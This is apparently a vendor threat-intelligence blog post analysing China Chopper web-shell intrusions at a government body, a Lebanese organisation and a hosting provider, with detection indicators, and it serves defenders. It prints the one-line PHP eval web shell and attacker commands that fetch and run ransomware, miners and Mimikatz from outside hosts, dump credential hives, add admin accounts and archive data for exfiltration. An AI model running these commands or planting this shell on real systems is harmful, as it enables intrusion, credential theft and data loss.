[China Chopper is a web shell that allows attackers to retain access to an](https://attack.mitre.org/software/S0020/)\ninfected system using a client side application which contains all the logic required to control\nthe target. Several threat groups have used China Chopper, and over the past two years,\nwe've seen several different campaigns utilizing this web shell and we chose to document\nthree most active campaigns in this blog post.\n\nWe decided to take a closer look at China Chopper after security firm Cybereason reported\n[on a massive attack against telecommunications providers called \"Operation Soft Cell,\"](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)\nwhich reportedly utilized China Chopper. Cisco Talos discovered significant China Chopper\nactivity over a two-year period beginning in June 2017, which shows that even nine years\nafter its creation, attackers are using China Chopper without significant modifications.\n\nThis web shell is widely available, so almost any threat actor can use. This also means it's\nnearly impossible to attribute attacks to a particular group using only presence of China\nChopper as an indicator.\n\nThe usage of China Chopper in recent campaigns proves that a lot of old threats never really\ndie, and defenders on the internet need to be looking out for malware both young and old.\n\n### What is China Chopper?\n\nChina Chopper is a tool that allows attackers to remotely control the target system that\nneeds to be running a web server application before it can be targeted by the tool. The web\nshell works on different platforms, but in this case, we focused only on compromised\nWindows hosts. China Chopper is a tool that has been used by some state-sponsored actors\nsuch as [Leviathan and](https://attack.mitre.org/groups/G0065/) [Threat Group-3390, but during our investigation we've seen actors](https://attack.mitre.org/groups/G0027/)\nwith varying skill levels.\n\nIn our research, we discovered both Internet Information Services (IIS) and Apache web\nservers compromised with China Chopper web shells. We do not have additional data about\nhow the web shell was installed, but there are several web application frameworks such as\nolder versions of Oracle WebLogic or WordPress that may have been targeted with known\nremote code execution or file inclusion exploits.\n\nChina Chopper provides the actor with a simple GUI that allows them to configure servers to\nconnect to and generate server-side code that must be added to the targeted website code\nin order to communicate.\n\n\n-----\n\n_China Chopper GUI_\n\nThe server-side code is extremely simple and contains, depending on the application\nplatform, just a single line of code. The backdoor supports .NET Active Server Pages or PHP.\n\nHere is an example of a server-side code for a compromised PHP application:\n```\n<?php @eval($_POST['test']);?>\n\n```\nWe cannot be sure if the simplicity of the server code was a deliberate decision on the part of\nthe China Chopper developers to make detection more difficult, but using pattern matching\non such as short snippet may produce some false positive detections.\n\nThe China Chopper client communicates with affected servers using HTTP POST requests.\nThe only function of the server-side code is to evaluate the request parameter specified\nduring the configuration of the server code in the client GUI. In our example, the expected\nparameter name is \"test.\" The communication over HTTP can be easily spotted in the\nnetwork packet captures.\n\nChina Chopper contains a remote shell (Virtual Terminal) function that has a first suggested\ncommand of 'netstat an|find \"ESTABLISHED.\"' and it is very likely that this command will be\nseen in process creation logs on affected systems.\n\n\n-----\n\n_China Chopper's first suggested Terminal command_\n\nWhen we analyze the packet capture, we can see that the parameter \"test\" contains another\neval statement.\n\nDepending on the command, the client will submit a certain number of parameters, z0 to zn.\nAll parameters are encoded with a standard base64 encoder before submission. Parameter\nz0 always contains the code to parse other parameters, launch requested commands and\nreturn the results to the client.\n```\ntest=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXl\n\n```\nEncoded China Chopper POST request with parameters\n\nIn this request, the decoded parameters are:\n```\nz0 @ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\">|\");;$p=base64_decode($_POST[\"z1\"]);$s=base64_decode($_POST[\"z2\"]);$d=dirname($_SERVE\nc \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";@system($r.\" 2>&1\",$ret);print ($ret!=0)?\"\nret={$ret}\n\":\"\";;echo(\"|<-\");die();\nz1 - cmd\nz2 - cd /d \"C:\\xampp\\htdocs\\dashboard\\\"&netstat -an | find \"ESTABLISHED\"&echo\n[S]&cd&echo [E]\n\n```\n\n-----\n\nThe end of the command \"&echo [S]&cd&echo [E]\" seems to be present in all virtual terminal\nrequests and may be used as a reliable indicator to detect China Chopper activity in packet\ncaptures or behavioral logs.\n\nApart from the terminal, China Chopper includes a file manager (with the ability to create\ndirectories, download files and change file metadata), a database manager and a\nrudimentary vulnerability scanner.\n\nWhat follows is our view into three different compromises, each with different goals, tools,\ntechniques and likely different actors.\n\n_Timeline of the observed case studies_\n\n### Case study No. 1: Espionage context\n\nWe identified the usage of China Chopper in a couple of espionage campaigns. Here, we\ninvestigate a campaign targeting an Asian government organization. In this campaign, China\nChopper was used in the internal network, installed on a few web servers used to store\npotentially confidential documents.\n\nThe purpose of the attacker was to obtain documents and database copies. The documents\nwere automatically compressed using WinRAR:\n```\ncd /d C:\\Windows\\Working_Directory\\\nrenamed_winrar a -m3 -hp19_Characters_Complex_Password -ta[date] -n*.odt -n*.doc n*.docx -n*.pdf -n*.xls -n*.xlsx -n*.ppt -n*.pptx -r c:\\output_directory\\files.rar\nc:\\directory_to_scan\\\n\n```\nThis command is used to create an archive containing documents modified after the date put\n\n\n-----\n\nas an argument. The archives are protected with a strong password containing uppercase,\nlowercase and special characters. The passwords were longer than 15 characters.\n\nWe assume the attacker ran this command periodically in order to get only new documents\nand minimize the quantity of exfiltrated data.\n\nOn the same target, we identified additional commands executed with China Chopper using\nWinRAR:\n```\nrar a -inul -ed -r -m3 -taDate -hp<profanity> ~ID.tmp c:\\directory_to_scan\n\n```\nChina Chopper is a public hacking tool and we cannot tell if in this case the attacker is the\nsame actor as before. But the rar command line here is sufficiently different to note that it\ncould be a different actor. The actor used an offensive phrase for a password, which is why\nwe've censored it here.\n\nThe attacker deployed additional tools to execute commands on the system:\n```\nC:\\windows\\Microsoft.NET\\Framework\\v2.0.50727\\MSBuild.exe\nC:\\windows\\temp\\Document.csproj /p:AssemblyName=C:\\windows\\temp\\downloader.png\n/p:ScriptFile=C:\\windows\\temp\\downloader.dat /p:Key=27_characters_key > random.tmp\n\n```\nMSBuild.exe is used to compile and execute a .NET application with two arguments: the\nScriptFile argument contains a PowerShell script encrypted with the value of the key\nargument. Here is the .NET code:\n\n_.NET loader code_\n\nThe .NET loader supports encrypted files or URLs as the script argument. If the operator\nuses an HTTP request, the loader downloads the payload with one of the hardcoded UserAgents. The loader decrypts the downloaded file and executes it:\n\n\n-----\n\n_Hardcoded User-Agent strings_\n\nIn our case, the purpose of the decrypted payload was to perform a database dump:\n```\npowershell.exe -exe bypass -nop -w hidden -c Import-Module\nC:\\windows\\help\\help\\helper.ps1;\nRun-MySQLQuery -ConnectionString 'Server=localhost;Uid=root;Pwd=;database=DBName;\nConvert Zero Datetime=True' -Query 'Select * from table where UID > 'Value' -Dump\n\n```\nThe \"where UID\" condition in the SQL query has the same purpose as the date in the\nprevious WinRAR command. We assume the attacker performs the query periodically and\ndoes not want to dump the entire database, but only the new entries. It is interesting to see\nthat after dumping the data, the attacker checks if the generated file is available and if it\ncontains any data:\n```\ndir /O:D c:\\working_directory\\db.csv\npowershell -nop -exec bypass Get-Content \"c:\\working_directory\\db.csv\" | SelectObject -First 10\n\n```\nHow are the file archives and the database dumps exfiltrated? Since the targeted server is in\nan internal network, the attacker simply maps a local drive and copies the file to it.\n```\ncd /d C:\\working_directory\\\nnet use \\192.168.0.10\\ipc$ /user:USER PASSWORD\nmove c:\\working_directory\\db.csv \\192.168.0.10\\destination_directory\n\n```\nThe attacker must have access to the remote system in order to exfiltrate data. We already\nsaw the usage of a HTTP tunnel tool to create a network tunnel between the infected system\nand a C2 server.\n\n### Case No. 2: Multi-purpose campaign\n\nWe observed another campaign targeting an organisation located in Lebanon. While our first\ncase describes a targeted campaign with the goal to exfiltrate data affecting internal servers,\nthis one is the opposite: an auxiliary public web site compromised by several attackers for\ndifferent purposes.\n\nWe identified actors trying to deploy ransomware on the vulnerable server using China\nChopper. The first attempt was Sodinokibi ransomware:\n\n\n-----\n\n```\ncertutil.exe urlcache split f hxxp://188.166.74[.]218/radm.exe\nC:\\Users\\UserA\\AppData\\Local\\Temp\\radm.exe\n\n```\n[The second delivered the Gandcrab ransomware:](https://blog.talosintelligence.com/2018/05/gandcrab-compromised-sites.html)\n```\nIf($ENV:PROCESSOR_ARCHITECTURE -contains 'AMD64'){ \nStart-Process -FilePath \"$Env:WINDIR\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\"\n-argument \"IEX ((new-object\nnet.webclient).downloadstring('https://pastebin.com/raw/Hd7BmJ33'));\nInvoke-ACAXGZFTTDUDKY;\nStart-Sleep -s 1000000;\" \n} else { \nIEX ((new-object net.webclient).downloadstring('https://pastebin.com/raw/Hd7BmJ33'));\nInvoke-ACAXGZFTTDUDKY;\nStart-Sleep -s 1000000; \n}\n\n```\nHere is the script hosted on Pastebin:\n\n_Reflective loader downloaded from pastebin.com_\n\nThe script executes a hardcoded PE file located — Gandcrab —at the end of the script using\na reflective DLL-loading technique.\n\nIn addition to the ransomware, we identified another actor trying to execute a Monero miner\non the vulnerable server with China Chopper:\n```\nPowershell -Command -windowstyle hidden -nop -enc -iex(New-Object\nNet.WebClient).DownloadString('hxxp://78.155.201[.]168:8667/6HqJB0SPQqbFbHJD/init.ps1'\n\n```\n\n-----\n\nHere's a look at the miner configuration:\n\n_Monero miner configuration_\n\nSome of the detected activity may have been manual and performed in order to get OS\ncredentials.\n\nTrying to get the registry:\n```\nreg save hklm\\sam sam.hive \nreg save hklm\\system system.hive\nreg save hklm\\security security.hive\n\n```\nUsing Mimikatz (with a few hiccups along the way):\n```\npowershell IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerS\nMimikatz.ps1');\nInvoke-Mimikatz >>c:\\1.txt\npowershell IEX\",\"(NewObject\",\"Net.WebClient).DownloadString('hxxp://is[.]gd/oeoFuI'); Invoke-Mimikatz DumpCreds\n\n```\n\n-----\n\n```\nC:\\Windows\\System32WindowsPowerShell\\v1.0\\powershell.exe IEX \n(NewObject\",\"Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestati\nMimikatz.ps1');\nInvoke-Mimikatz\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[Environment]::Is64BitProcess\npowershell.exe IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerS\nMimikatz.ps1');\nInvoke-Mimikatz >>c:\\1.txt\n\n```\nAttempting to dump password hashes using a PowerShell module and the command line:\n```\nIEX (New-Object \nNet.WebClient).DownloadString('https://raw.githubusercontent.com/klionsec/CommonTools/\nPassHashes.ps1');Get-PassHashes;\n\n```\nThe attackers also tried procdump64.exe on lsass.exe to get the local credentials stored in\nmemory. In addition to the multiple attempts to dump the credential, the attackers had to deal\nwith typos: missed spaces, wrong commands or letters switching.\n\nOne of the actors successfully acquired the credentials and tried to pivot internally by using\nthe credentials and the \"net use\" commands.\n\n[Finally, several remote access tools such as Gh0stRAT and Venom multi-hop proxy were](https://blog.talosintelligence.com/2019/06/threat-roundup-0607-0614.html)\ndeployed on the machine, as well as a remote shell written purely in PowerShell.\n\n### Case No. 3: Web hosting providers compromised\n\nIn one campaign, we discovered an Asian web-hosting provider under attack, with the most\nsignificant compromise spanning several Windows servers over a period of 10 months. Once\nagain, we cannot be sure if this was a single actor or multiple groups, since the activities\ndiffer depending on the attacked server. We show just a subset of observed activities.\n\n**Server 1**\n\nGenerally, the attackers seek to create a new user and then add the user to the group of\nusers with administrative privileges, presumably to access and modify other web applications\nhosted on a single physical server.\n\n\n-----\n\n```\ncd /d C:\\compromisedappdirectory&net user user pass /add\ncd /d C:\\compromisedappdirectory&net localgroup administrattors user /add\n\n```\nNotice the misspelling of the word \"administrators.\" The actor realizes that the addition of the\nuser was not successful and attempts a different technique. They download and install an\narchive containing executables and trivially modified source code of the password-stealing\n[tool \"Mimikatz Lite\" as GetPassword.exe.](https://github.com/infosecsmith/MimikatzLite)\n\nThe tool investigates the Local Security Authority Subsystem memory space in order to find,\ndecrypt and display retrieved passwords. The only change, compared with the original tool is\nthat actors change the color and the code page of the command window. The color is\nchanged so that green text is displayed on a black background and the active console code\npage is changed to the Chinese code page 936.\n\nFinally, the actor attempts to dump the database of a popular mobile game \"Clash of Kings,\"\npossibly hosted on a private server.\n\n**Server 2**\n\nAn actor successfully tested China Chopper on a second server and stopped the activity.\nHowever, we also found another Monero cryptocurrency miner just as we found commodity\nmalware on other systems compromised with China Chopper.\n\nThe actors first reset the Access Control List for the Windows temporary files folder and take\nownership of the folder. They then allow the miner executable through the Windows Firewall\nand finally launch the mining payload.\n```\nC:\\Windows\\system32\\icacls.exe C:\\Windows\\Temp /Reset /T\nC:\\Windows\\system32\\takeown.exe /F C:\\Windows\\Temp\nC:\\Windows\\system32\\netsh.exe Firewall Add AllowedProgram C:\\Windows\\Temp\\lsass.eXe\nWindows Update Enable\nC:\\Windows\\Temp\\lsass.eXe\n\n```\n**Server 3**\n\nThe attack on this server starts by downloading a number of public and private tools, though\nwe were not able to retrieve them.\n\nThe actor attempts to exploit [CVE-2018–8440 — an elevation of privilege vulnerability in](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8440)\nWindows when it improperly handles calls to Advanced Local Procedure Call — to elevate\n[the privileges using a modified proof-of-concept exploit.](https://github.com/GossiTheDog/zeroday)\n```\ncd /d C:\\directoryofcompromisedapp&rundll32 C:\\directoryofcompromisedapp\\ALPCTaskSched-LPE.dll,a\n\n```\nThe attacker launches several custom tools and an available tool that attempts to create a\n\n\n-----\n\nnew user iis_uses and change DACLs to allow the users to modify certain operating system\nobjects.\n\nThe attacker obtains the required privileges and launches a few other tools to modify the\naccess control lists (ACLs) of all websites running on the affected server. This is likely done\nto compromise other sites or to run a web defacement campaign.\n```\ncacls \\. C:\\path_to_a_website /T /E /C /G Everyone:F\n\n```\nFinally, the actor attempts to launch Powershell Mimikatz loader to get more credentials from\nmemory and save the credentials into a text file:\n```\npowershell -nop -exec bypass -c IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/ma\nMimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz|Out-File\n-Encoding ASCII outputfile.txt\n\n```\n**Server 4**\n\nThe China Chopper actor activity starts with the download and execution of two exploit files\n[which attempt to exploit the Windows vulnerabilities CVE-2015-0062,](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2015-0062) [CVE-2015-1701 and](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2015-1701)\n[CVE-2016-0099 to allow the attacker to modify other objects on the server.](https://www.cvedetails.com/cve/CVE-2016-0099/)\n\nOnce the privilege escalation was successful, the actor adds a new user account and adds\nthe account to the administrative group.\n```\nnet user admin admin /ad\nnet localgroup administrators admin /ad\n\n```\nThe attacker next logs on to the server with a newly created user account and launches a\nfree tool replacestudio32.exe, a GUI utility that easily searches through text-based files and\nperforms replacement with another string. Once again, this could be used to affect all sites\nhosted on the server or simply deface pages.\n\n### Conclusion\n\nInsecure web applications provide an effective entry point for attackers and allow them to\ninstall additional tools such as web shells, conduct reconnaissance and pivot to other\nsystems.\n\nAlthough China Chopper is an old tool, we still see it being used by attackers with various\ngoals and skill levels and in this post we showed some of the common tools, techniques and\nprocesses employed in three separate breaches. Because it is so easy to use, it's impossible\nto confidently connect it to any particular actor or group\n\n\n-----\n\nIn our research we documented three separate campaigns active over a period of several\nmonths. This corroborates the claim that an average time to detect an intrusion is over 180\ndays and implies that defenders should approach building their security teams and\nprocesses around an assumption that the organization has already been breached. It is\ncrucial that an incident response team should have a permission to proactively hunt for\nbreaches, not only to respond to alerts raised by automated detection systems or escalated\nby the first line security analysts.\n\nWhen securing the infrastructure it is important to keep internal as well as external facing\nweb servers, applications, and frameworks up to date with the latest security patches to\nmitigate risk of compromise with already known exploits.\n\nDespite the age, China Chopper is here to stay, and we will likely see it in the wild going\nforward.\n\n## Coverage\n\n[Intrusion prevention systems such as SNORT® provide an effective tool to detect China](https://snort.org/)\nChopper activity due to specific signatures present at the end of each command. In addition\nto intrusion prevention systems, it is advisable to employ endpoint detection and response\ntools (EDR) such as [Cisco AMP for Endpoints, which gives users the ability to track process](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\ninvocation and inspect processes.
